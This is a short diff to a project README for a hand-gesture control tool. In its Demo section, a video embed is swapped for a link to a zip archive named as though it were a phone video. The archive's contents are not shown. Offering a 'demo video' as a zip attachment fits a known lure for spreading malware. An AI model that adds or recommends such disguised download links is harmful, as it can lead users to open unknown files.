@@ -33,7 +33,7 @@ pip install opencv-python mediapipe pyautogui
 # Demo
 Here’s a simple demo of how the project works:
 
-[![Demo]("C:\Users\ymrat\OneDrive\Desktop\VID-20240510-WA0000.mp4")](https://www.youtube.com/watch?v=VIDEO_ID)
+[VID-20240510-WA0000.zip](https://github.com/user-attachments/files/17147229/VID-20240510-WA0000.zip)
 
 
 # Known Issues
